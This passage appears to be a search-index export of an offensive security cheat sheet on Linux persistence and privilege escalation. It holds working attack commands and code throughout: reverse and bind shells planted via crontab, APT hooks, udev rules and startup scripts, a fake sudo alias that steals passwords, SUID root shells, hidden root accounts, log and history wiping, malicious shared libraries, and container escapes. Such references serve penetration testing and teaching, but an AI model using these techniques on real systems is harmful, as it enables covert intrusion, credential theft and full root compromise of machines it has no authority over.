Exec=/var/lib/gnome-welcome-tour AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide OnlyShowIn=GNOME; X-GNOME-Autostart-enabled=false Backdooring a driver echo \"ACTION==\\\"add\\\",ENV{DEVTYPE}==\\\"usb_device\\\",SUBSYSTEM==\\\"usb\\\",RUN+=\\\"$RSHELL\\\"\" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null Backdooring the APT If you can create a file on the apt.conf.d directory with: APT::Update::Pre-Invoke {\"CMD\"}; Next time \"apt-get update\" is done, your CMD will be executed! echo 'APT::Update::Pre-Invoke {\"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &\"};' > /etc/apt/apt.conf.d/42backdoor Backdooring the SSH Add an ssh key into the ~/.ssh folder. ssh-keygen write the content of ~/.ssh/id_rsa.pub into ~/.ssh/authorized_keys set the right permission, 700 for ~/.ssh and 600 for authorized_keys Tips Hide the payload with ANSI chars, the following chars will clear the terminal when using cat to display the content of your payload. #\u001b[2J\u001b[2J\u001b[2J\u001b[2H\u001b[2A# Do not remove. Generated from /etc/issue.conf by configure. Hide in plain sight using zero width spaces in filename. touch $(echo -n 'index\\u200D.php') index.php Clear the last line of the history. history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null Clear history [SPACE] ANY COMMAND or export HISTSIZE=0 export HISTFILESIZE=0 unset HISTFILE; CTRL-D or kill -9 $$ or echo \"\" > ~/.bash_history or rm ~/.bash_history -rf or history -c or ln /dev/null ~/.bash_history -sf The following directories are temporary and usually writeable /var/tmp/ /tmp/ /dev/shm/ Additional Persistence Options SSH Authorized Keys Compromise Client Software Binary Create Account Create Account: Local Account Create or Modify System Process Create or Modify System Process: Systemd Service Event Triggered Execution: Trap Event Triggered Execution Event Triggered Execution: .bash_profile and .bashrc External Remote Services Hijack Execution Flow Hijack Execution Flow: LD_PRELOAD Pre-OS Boot Pre-OS Boot: Bootkit Scheduled Task/Job Scheduled Task/Job: At (Linux) Scheduled Task/Job: Cron Server Software Component Server Software Component: SQL Stored Procedures Server Software Component: Transport Agent Server Software Component: Web Shell Traffic Signaling Traffic Signaling: Port Knocking Valid Accounts: Default Accounts Valid Accounts: Domain Accounts 2 References @RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289 https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/ http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/ Pouki from JDI","title":"Linux - Persistence"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#linux-persistence","text":"","title":"Linux - Persistence"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#summary","text":"Basic reverse shell Add a root user Suid Binary Crontab - Reverse shell Backdooring a user's bash_rc Backdooring a startup service Backdooring a user startup file Backdooring a driver Backdooring the APT Backdooring the SSH Tips Additional Linux Persistence Options References","title":"Summary"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#basic-reverse-shell","text":"ncat --udp -lvp 4242 ncat --sctp -lvp 4242 ncat --tcp -lvp 4242","title":"Basic reverse shell"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#add-a-root-user","text":"sudo useradd -ou 0 -g 0 john sudo passwd john echo \"linuxpassword\" | passwd --stdin john","title":"Add a root user"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#suid-binary","text":"TMPDIR2=\"/var/tmp\" echo 'int main(void){setresuid(0, 0, 0);system(\"/bin/sh\");}' > $TMPDIR2/croissant.c gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null rm $TMPDIR2/croissant.c chown root:root $TMPDIR2/croissant chmod 4777 $TMPDIR2/croissant","title":"Suid Binary"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#crontab-reverse-shell","text":"(crontab -l ; echo \"@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash\")|crontab 2> /dev/null","title":"Crontab - Reverse shell"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-a-users-bash_rc","text":"(FR/EN Version) TMPNAME2=\".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0\" cat << EOF > /tmp/$TMPNAME2 alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \\$locale = \"en\" ]; then echo -n \"[sudo] password for \\$USER: \";fi;if [ \\$locale = \"fr\" ]; then echo -n \"[sudo] Mot de passe de \\$USER: \";fi;read -s pwd;echo; unalias sudo; echo \"\\$pwd\" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S ' EOF if [ -f ~/.bashrc ]; then cat /tmp/$TMPNAME2 >> ~/.bashrc fi if [ -f ~/.zshrc ]; then cat /tmp/$TMPNAME2 >> ~/.zshrc fi rm /tmp/$TMPNAME2 or add the following line inside its .bashrc file. $ chmod u+x ~/.hidden/fakesudo $ echo \"alias sudo=~/.hidden/fakesudo\" >> ~/.bashrc and create the fakesudo script. read -sp \"[sudo] password for $USER: \" sudopass echo \"\" sleep 2 echo \"Sorry, try again.\" echo $sudopass >> /tmp/pass.txt /usr/bin/sudo $@","title":"Backdooring a user's bash_rc"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-a-startup-service","text":"RSHELL=\"ncat $LMTHD $LHOST $LPORT -e \\\"/bin/bash -c id;/bin/bash\\\" 2>/dev/null\" sed -i -e \"4i \\$RSHELL\" /etc/network/if-up.d/upstart","title":"Backdooring a startup service"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-a-user-startup-file","text":"Linux, write a file in ~/.config/autostart/NAME_OF_FILE.desktop In : ~/.config/autostart/*.desktop [Desktop Entry] Type=Application Name=Welcome Exec=/var/lib/gnome-welcome-tour AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide OnlyShowIn=GNOME; X-GNOME-Autostart-enabled=false","title":"Backdooring a user startup file"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-a-driver","text":"echo \"ACTION==\\\"add\\\",ENV{DEVTYPE}==\\\"usb_device\\\",SUBSYSTEM==\\\"usb\\\",RUN+=\\\"$RSHELL\\\"\" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null","title":"Backdooring a driver"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-the-apt","text":"If you can create a file on the apt.conf.d directory with: APT::Update::Pre-Invoke {\"CMD\"}; Next time \"apt-get update\" is done, your CMD will be executed! echo 'APT::Update::Pre-Invoke {\"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &\"};' > /etc/apt/apt.conf.d/42backdoor","title":"Backdooring the APT"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-the-ssh","text":"Add an ssh key into the ~/.ssh folder. ssh-keygen write the content of ~/.ssh/id_rsa.pub into ~/.ssh/authorized_keys set the right permission, 700 for ~/.ssh and 600 for authorized_keys","title":"Backdooring the SSH"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#tips","text":"Hide the payload with ANSI chars, the following chars will clear the terminal when using cat to display the content of your payload. #\u001b[2J\u001b[2J\u001b[2J\u001b[2H\u001b[2A# Do not remove. Generated from /etc/issue.conf by configure. Hide in plain sight using zero width spaces in filename. touch $(echo -n 'index\\u200D.php') index.php Clear the last line of the history. history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null Clear history [SPACE] ANY COMMAND or export HISTSIZE=0 export HISTFILESIZE=0 unset HISTFILE; CTRL-D or kill -9 $$ or echo \"\" > ~/.bash_history or rm ~/.bash_history -rf or history -c or ln /dev/null ~/.bash_history -sf The following directories are temporary and usually writeable /var/tmp/ /tmp/ /dev/shm/","title":"Tips"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#additional-persistence-options","text":"SSH Authorized Keys Compromise Client Software Binary Create Account Create Account: Local Account Create or Modify System Process Create or Modify System Process: Systemd Service Event Triggered Execution: Trap Event Triggered Execution Event Triggered Execution: .bash_profile and .bashrc External Remote Services Hijack Execution Flow Hijack Execution Flow: LD_PRELOAD Pre-OS Boot Pre-OS Boot: Bootkit Scheduled Task/Job Scheduled Task/Job: At (Linux) Scheduled Task/Job: Cron Server Software Component Server Software Component: SQL Stored Procedures Server Software Component: Transport Agent Server Software Component: Web Shell Traffic Signaling Traffic Signaling: Port Knocking Valid Accounts: Default Accounts Valid Accounts: Domain Accounts 2","title":"Additional Persistence Options"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#references","text":"@RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289 https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/ http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/ Pouki from JDI","title":"References"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/","text":"Linux - Privilege Escalation Summary Tools Checklist Looting for passwords Files containing passwords Old passwords in /etc/security/opasswd Last edited files In memory passwords Find sensitive files SSH Key Sensitive files SSH Key Predictable PRNG (Authorized_Keys) Process Scheduled tasks Cron jobs Systemd timers SUID Find SUID binaries Create a SUID binary Capabilities List capabilities of binaries Edit capabilities Interesting capabilities SUDO NOPASSWD LD_PRELOAD and NOPASSWD Doas sudo_inject CVE-2019-14287 GTFOBins Wildcard Writable files Writable /etc/passwd Writable /etc/sudoers NFS Root Squashing Shared Library ldconfig RPATH Groups Docker LXC/LXD Hijack TMUX session Kernel Exploits CVE-2022-0847 (DirtyPipe) CVE-2016-5195 (DirtyCow) CVE-2010-3904 (RDS) CVE-2010-4258 (Full Nelson) CVE-2012-0056 (Mempodipper) Tools There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors. Here are a few: LinPEAS - Linux Privilege Escalation Awesome Script powershell wget \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -O linpeas.sh curl \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -o linpeas.sh ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete. ./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk. ./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs powershell wget \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -O lse.sh curl \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -o lse.sh ./lse.sh -l1 # shows interesting information that should help you to privesc ./lse.sh -l2 # dump all the information it gathers about the system LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks powershell ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t BeRoot - Privilege Escalation Project - Windows / Linux / Mac linuxprivchecker.py - a Linux Privilege Escalation Check Script unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check Privilege Escalation through sudo - Linux Checklists Kernel and distribution release details System Information: Hostname Networking details: Current IP Default route details DNS server information User Information: Current user details Last logged on users Shows users logged onto the host List all users including uid/gid information List root accounts Extracts password policies and hash storage method information Checks umask value Checks if password hashes are stored in /etc/passwd Extract full details for 'default' uid's such as 0, 1000, 1001 etc Attempt to read restricted files i.e. /etc/shadow List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.) Basic SSH checks Privileged access: Which users have recently used sudo Determine if /etc/sudoers is accessible Determine if the current user has Sudo access without a password Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.) Is root's home directory accessible List permissions for /home/ Environmental: Display current $PATH Displays env information Jobs/Tasks: List all cron jobs Locate all world-writable cron jobs Locate cron jobs owned by other users of the system List the active and inactive systemd timers Services: List network connections (TCP & UDP) List running processes Lookup and list process binaries and associated permissions List inetd.conf/xined.conf contents and associated binary file permissions List init.d binary permissions Version Information (of the following): Sudo MYSQL Postgres Apache Checks user config Shows enabled modules Checks for htpasswd files View www directories Default/Weak Credentials: Checks for default/weak Postgres accounts Checks for default/weak MYSQL accounts Searches: Locate all SUID/GUID files Locate all world-writable SUID/GUID files Locate all SUID/GUID files owned by root Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc) Locate files with POSIX capabilities List all world-writable files Find/list all accessible *.plan files and display contents Find/list all accessible *.rhosts files and display contents Show NFS server details Locate .conf and .log files containing keyword supplied at script runtime List all *.conf files located in /etc Locate mail Platform/software specific tests: Checks to determine if we're in a Docker container Checks to see if the host has Docker installed Checks to determine if we're in an LXC container Looting for passwords Files containing passwords grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null find . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\; Old passwords in /etc/security/opasswd The /etc/security/opasswd file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them. :warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes Last edited files Files that were edited in the last 10 minutes find / -mmin -10 2>/dev/null | grep -Ev \"^/proc\" In memory passwords strings /dev/mem -n10 | grep -i PASS Find sensitive files $ locate password | more /boot/grub/i386-pc/password.mod /etc/pam.d/common-password /etc/pam.d/gdm-password /etc/pam.d/gdm-password.original /lib/live/config/0031-root-password ... SSH Key Sensitive files find / -name authorized_keys 2> /dev/null find / -name id_rsa 2> /dev/null ... SSH Key Predictable PRNG (Authorized_Keys) Process This module describes how to attempt to use an obtained authorized_keys file on a host system. Needed : SSH-DSS String from authorized_keys file Steps Get the authorized_keys file. An example of this file would look like so: ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... Since this is an ssh-dss key, we need to add that to our local copy of /etc/ssh/ssh_config and /etc/ssh/sshd_config : echo \"PubkeyAcceptedKeyTypes=+ssh-dss\" >> /etc/ssh/ssh_config echo \"PubkeyAcceptedKeyTypes=+ssh-dss\" >> /etc/ssh/sshd_config /etc/init.d/ssh restart Get g0tmi1k's debian-ssh repository and unpack the keys: git clone https://github.com/g0tmi1k/debian-ssh cd debian-ssh tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2 Grab the first 20 or 30 bytes from the key file shown above starting with the \"AAAA...\" portion and grep the unpacked keys with it as: grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf' dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do: ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934 And you should connect without requiring a password. If stuck, the -vvv verbosity should provide enough details as to why. Scheduled tasks Cron jobs Check if you have access with write permission on these files. Check inside the file, to find other paths with write permissions. /etc/init.d /etc/cron* /etc/crontab /etc/cron.allow /etc/cron.d /etc/cron.deny /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly /etc/sudoers /etc/exports /etc/anacrontab /var/spool/cron /var/spool/cron/crontabs/root crontab -l ls -alh /var/spool/cron; ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny* You can use pspy to detect a CRON job. # print both commands and file system events and scan procfs every 1000 ms (=1sec) ./pspy64 -pf -i 1000 Systemd timers systemctl list-timers --all NEXT LEFT LAST PASSED UNIT ACTIVATES Mon 2019-04-01 02:59:14 CEST 15h left Sun 2019-03-31 10:52:49 CEST 24min ago apt-daily.timer apt-daily.service Mon 2019-04-01 06:20:40 CEST 19h left Sun 2019-03-31 10:52:49 CEST 24min ago apt-daily-upgrade.timer apt-daily-upgrade.service Mon 2019-04-01 07:36:10 CEST 20h left Sat 2019-03-09 14:28:25 CET 3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service 3 timers listed. SUID SUID/Setuid stands for \"set user ID upon execution\", it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is root , the uid will be changed to root even if it was executed from user bob . SUID bit is represented by an s . \u256d\u2500swissky@lab ~ \u2570\u2500$ ls /usr/bin/sudo -alh -rwsr-xr-x 1 root root 138K 23 nov. 16:04 /usr/bin/sudo Find SUID binaries find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\; find / -uid 0 -perm -4000 -type f 2>/dev/null Create a SUID binary Function Description setreuid() sets real and effective user IDs of the calling process setuid() sets the effective user ID of the calling process setgid() sets the effective group ID of the calling process print 'int main(void){\\nsetresuid(0, 0, 0);\\nsystem(\"/bin/sh\");\\n}' > /tmp/suid.c gcc -o /tmp/suid /tmp/suid.c sudo chmod +x /tmp/suid # execute right sudo chmod +s /tmp/suid # setuid bit Capabilities List capabilities of binaries \u256d\u2500swissky@lab ~ \u2570\u2500$ /usr/bin/getcap -r /usr/bin /usr/bin/fping = cap_net_raw+ep /usr/bin/dumpcap = cap_dac_override,cap_net_admin,cap_net_raw+eip /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep /usr/bin/rlogin = cap_net_bind_service+ep /usr/bin/ping = cap_net_raw+ep /usr/bin/rsh = cap_net_bind_service+ep /usr/bin/rcp = cap_net_bind_service+ep Edit capabilities /usr/bin/setcap -r /bin/ping # remove /usr/bin/setcap cap_net_raw+p /bin/ping # add Interesting capabilities Having the capability =ep means the binary has all the capabilities. $ getcap openssl /usr/bin/openssl openssl=ep Alternatively the following capabilities can be used in order to upgrade your current privileges. cap_dac_read_search # read anything cap_setuid+ep # setuid Example of privilege escalation with cap_setuid+ep $ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7 $ python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' sh-5.0# id uid=0(root) gid=1000(swissky) Capabilities name Description CAP_AUDIT_CONTROL Allow to enable/disable kernel auditing CAP_AUDIT_WRITE Helps to write records to kernel auditing log CAP_BLOCK_SUSPEND This feature can block system suspends CAP_CHOWN Allow user to make arbitrary change to files UIDs and GIDs CAP_DAC_OVERRIDE This helps to bypass file read, write and execute permission checks CAP_DAC_READ_SEARCH This only bypass file and directory read/execute permission checks CAP_FOWNER This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file CAP_KILL Allow the sending of signals to processes belonging to others CAP_SETGID Allow changing of the GID CAP_SETUID Allow changing of the UID CAP_SETPCAP Helps to transferring and removal of current set to any PID CAP_IPC_LOCK This helps to lock memory CAP_MAC_ADMIN Allow MAC configuration or state changes CAP_NET_RAW Use RAW and PACKET sockets CAP_NET_BIND_SERVICE SERVICE Bind a socket to internet domain privileged ports SUDO Tool: Sudo Exploitation NOPASSWD Sudo configuration might allow a user to execute some command with another user privileges without knowing the password. $ sudo -l User demo may run the following commands on crashlab: (root) NOPASSWD: /usr/bin/vim In this example the user demo can run vim as root , it is now trivial to get a shell by adding an ssh key into the root directory or by calling sh . sudo vim -c '!sh' sudo -u root vim -c '!sh' LD_PRELOAD and NOPASSWD If LD_PRELOAD is explicitly defined in the sudoers file Defaults env_keep += LD_PRELOAD Compile the following shared object using the C code below with gcc -fPIC -shared -o shell.so shell.c -nostartfiles #include <stdio.h> #include <sys/types.h> #include <stdlib.h> #include <unistd.h> void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/sh\"); } Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_so_file> <program> , e.g: sudo LD_PRELOAD=/tmp/shell.so find Doas There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf permit nopass demo as root cmd vim sudo_inject Using https://github.com/nongiach/sudo_inject $ sudo whatever [sudo] password for user: # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens. $ sh exploit.sh .... wait 1 seconds $ sudo -i # no password required :) # id uid=0(root) gid=0(root) groups=0(root) Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf CVE-2019-14287 # Exploitable when a user have the following permissions (sudo -l) (ALL, !root) ALL # If you have a full TTY, you can exploit it like this sudo -u#-1 /bin/bash sudo -u#4294967295 id GTFOBins GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks. gdb -nx -ex '!sh' -ex quit sudo mysql -e '! /bin/sh' strace -o /dev/null /bin/sh sudo awk 'BEGIN {system(\"/bin/sh\")}' Wildcard By using tar with \u2013checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. \u201cTricking\u201d root to use the specific options is quite easy, and that's where the wildcard comes in handy. # create file for exploitation touch -- \"--checkpoint=1\" touch -- \"--checkpoint-action=exec=sh shell.sh\" echo \"#\\!/bin/bash\\ncat /etc/passwd > /tmp/flag\\nchmod 777 /tmp/flag\" > shell.sh # vulnerable script tar cf archive.tar * Tool: wildpwn Writable files List world writable files on the system. find / -writable ! -user `whoami` -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \\; 2>/dev/null find / -perm -2 -type f 2>/dev/null find / ! -path \"*/proc/*\" -perm -2 -type f -print 2>/dev/null Writable /etc/sysconfig/network-scripts/ (Centos/Redhat) /etc/sysconfig/network-scripts/ifcfg-1337 for example NAME=Network /bin/id &lt;= Note the blank space ONBOOT=yes DEVICE=eth0 EXEC : ./etc/sysconfig/network-scripts/ifcfg-1337 src : https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f Writable /etc/passwd First generate a password with one of the following commands. openssl passwd -1 -salt hacker hacker mkpasswd -m SHA-512 hacker python2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\")' Then add the user hacker and add the generated password. hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash E.g: hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash You can now use the su command with hacker:hacker Alternatively you can use the following lines to add a dummy user without a password. WARNING: you might degrade the current security of the machine. echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd su - dummy NOTE: In BSD platforms /etc/passwd is located at /etc/pwd.db and /etc/master.passwd , also the /etc/shadow is renamed to /etc/spwd.db . Writable /etc/sudoers echo \"username ALL=(ALL:ALL) ALL\">>/etc/sudoers # use SUDO without password echo \"username ALL=(ALL) NOPASSWD: ALL\" >>/etc/sudoers echo \"username ALL=NOPASSWD: /bin/bash\" >>/etc/sudoers NFS Root Squashing When no_root_squash appears in /etc/exports , the folder is shareable and a remote user can mount it. # remote check the name of the folder showmount -e 10.10.10.10 # create dir mkdir /tmp/nfsdir # mount directory mount -t nfs 10.10.10.10:/shared /tmp/nfsdir cd /tmp/nfsdir # copy wanted shell cp /bin/bash . # set suid permission chmod +s bash Shared Library ldconfig Identify shared libraries with ldd $ ldd /opt/binary linux-vdso.so.1 (0x00007ffe961cd000) vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000) /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000) Create a library in /tmp and activate the path. gcc \u2013Wall \u2013fPIC \u2013shared \u2013o vulnlib.so /tmp/vulnlib.c echo \"/tmp/\" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so /opt/binary RPATH level15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\" 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000f (RPATH) Library rpath: [/var/tmp/flag15] level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 => (0x0068c000) libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x005bb000) By copying the lib into /var/tmp/flag15/ it will be used by the program in this place as specified in the RPATH variable. level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/ level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 => (0x005b0000) libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x00737000) Then create an evil library in /var/tmp with gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6 #include<stdlib.h> #define SHELL \"/bin/sh\" int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { char *file = SHELL; char *argv[] = {SHELL,0}; setresuid(geteuid(),geteuid(), geteuid()); execve(file,argv,0); } Groups Docker Mount the filesystem in a bash container, allowing you to edit the /etc/passwd as root, then add a backdoor account toor:password . $> docker run -it --rm -v $PWD:/mnt bash $> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd Almost similar but you will also see all processes running on the host and be connected to the same NICs. docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash Or use the following docker image from chrisfosterelli to spawn a root shell $ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease latest: Pulling from chrisfosterelli/rootplease 2de59b831a23: Pull complete 354c3661655e: Pull complete 91930878a2d7: Pull complete a3ed95caeb02: Pull complete 489b110c54dc: Pull complete Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0 Status: Downloaded newer image for chrisfosterelli/rootplease:latest You should now have a root shell on the host OS Press Ctrl-D to exit the docker instance / shell sh-5.0# id uid=0(root) gid=0(root) groups=0(root) More docker privilege escalation using the Docker Socket. sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh LXC/LXD The privesc requires to run a container with elevated privileges and mount the host filesystem inside. \u256d\u2500swissky@lab ~ \u2570\u2500$ id uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel) Build an Alpine image and start it using the flag security.privileged=true , forcing the container to interact as root with the host filesystem. # build a simple alpine image git clone https://github.com/saghul/lxd-alpine-builder ./build-alpine -a i686 # import the image lxc image import ./alpine.tar.gz --alias myimage # run the image lxc init myimage mycontainer -c security.privileged=true # mount the /root into the image lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true # interact with the container lxc start mycontainer lxc exec mycontainer /bin/sh Alternatively https://github.com/initstring/lxd_root Hijack TMUX session Require a read access to the tmux socket : /tmp/tmux-1000/default . export TMUX=/tmp/tmux-1000/default,1234,0 tmux ls Kernel Exploits Precompiled exploits can be found inside these repositories, run them at your own risk ! * bin-sploits - @offensive-security * kernel-exploits - @lucyoa The following exploits are known to work well, search for more exploits with searchsploit -w linux kernel centos . Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing uname -a Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/. CVE-2022-0847 (DirtyPipe) Linux Privilege Escalation - Linux Kernel 5.8 < 5.16.11 https://www.exploit-db.com/exploits/50808 CVE-2016-5195 (DirtyCow) Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8 # make dirtycow stable echo 0 > /proc/sys/vm/dirty_writeback_centisecs g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c CVE-2010-3904 (RDS) Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8 https://www.exploit-db.com/exploits/15285/ CVE-2010-4258 (Full Nelson) Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) https://www.exploit-db.com/exploits/15704/ CVE-2012-0056 (Mempodipper) Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) https://www.exploit-db.com/exploits/18411 References SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m Privilege escalation via Docker - April 22, 2015 - Chris Foster An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018 Exploiting wildcards on Linux - Berislav Kucan Code Execution With Tar Command - p4pentest Back To The Future: Unix Wildcards Gone Wild - Leon Juranic HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018 Privilege Escalation via lxd - @reboare Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018 Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates Local Privilege Escalation Workshop - Slides.pdf - @sagishahar SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs The Dirty Pipe Vulnerability","title":"Linux - Privilege Escalation"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#linux-privilege-escalation","text":"","title":"Linux - Privilege Escalation"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#summary","text":"Tools Checklist Looting for passwords Files containing passwords Old passwords in /etc/security/opasswd Last edited files In memory passwords Find sensitive files SSH Key Sensitive files SSH Key Predictable PRNG (Authorized_Keys) Process Scheduled tasks Cron jobs Systemd timers SUID Find SUID binaries Create a SUID binary Capabilities List capabilities of binaries Edit capabilities Interesting capabilities SUDO NOPASSWD LD_PRELOAD and 